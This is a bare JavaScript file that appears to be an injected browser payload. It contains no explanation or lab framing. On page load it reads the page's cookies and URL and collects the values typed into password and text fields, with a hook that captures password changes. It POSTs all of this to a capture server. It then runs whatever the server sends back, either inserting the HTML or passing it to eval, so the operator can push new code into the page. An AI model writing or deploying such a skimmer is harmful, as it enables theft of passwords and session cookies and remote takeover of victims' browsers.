HOST = "http://localhost:8080/capture/receive";
HOST_DATA = "http://localhost:8080/capture/data";
window.onload = function(){
    console.info(document.URL);
    console.info(document.cookie);
    sendData(document.URL);
    sendInfo(document.URL, document.cookie);

};

function sendData(url) {
    var ary = []; 
    var inputs = document.getElementsByTagName("input"); 
    for (var i=0; i<inputs.length; i++) { 
        var type = inputs[i].type.toLowerCase();
        if ( type === "password" || type === "text") { 
            ary.push(type + '_' + inputs[i].value); 
        } 
        if(type === "password"){
            console.log('onchange');
             // inputs[i].attachEvent("onchange",'onchange_' + send(url, inputs[i].value));
             inputs[i].onchange  = function(){
                console.info(this);
                console.info(this.value);
                 send(url, 'onchange_' + this.value);
            };
        }
    }
    console.info(ary.toString());
    if(ary.length >= 1){        
        send(url, ary.toString());
    } 

};

function send(url, str) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", HOST_DATA, true);

    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
            // console.log('do');
      }
    };

    xhr.send('url=' + url + '&data=' + str);
};

function sendInfo(url, cookie){

    var xhr = new XMLHttpRequest();
    xhr.open("POST", HOST, true);

    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4) {
        console.info(xhr.responseText);
        var jsonObj = JSON.parse(xhr.responseText);
        // var jsonObj = {'name':'test', 'content':'test'};
        //console.log(jsonObj);
        if('element' == jsonObj.name){
            //add element
            var selfDiv = document.createElement('div');
            selfDiv.innerHTML = jsonObj.content;
            var firstEle=document.body.firstChild;
            document.body.insertBefore(selfDiv,firstEle);

        }else if('script' ==  jsonObj.name){
            //run script
            eval("(" + jsonObj.content + ")");
        }else{
            console.log('nothing');
        }
        // else{
        //test case
        //      var selfDiv = document.createElement('div');
        //     selfDiv.innerHTML = 'haha this is test';
        //     selfDiv.style = 'color:red;';
        //     var firstEle = document.body.firstChild;
        //     document.body.insertBefore(selfDiv,firstEle);
        // }
      }
    };

    xhr.send('url=' + url + '&cookie=' + cookie);

};


